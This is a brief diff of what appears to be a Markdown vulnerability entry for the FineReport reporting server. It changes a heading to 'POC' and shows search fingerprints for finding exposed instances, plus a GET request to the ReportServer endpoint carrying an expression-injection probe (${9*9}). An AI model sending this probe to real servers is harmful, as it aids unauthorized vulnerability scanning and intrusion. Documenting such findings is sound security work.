@@ -10,7 +10,7 @@ body="isSupportForgetPwd"
 app="帆软-FineReport"
 ```
 
-## poc
+## POC
 
 ```java
 GET /webroot/decision/view/ReportServer?test=&n=${9*9}
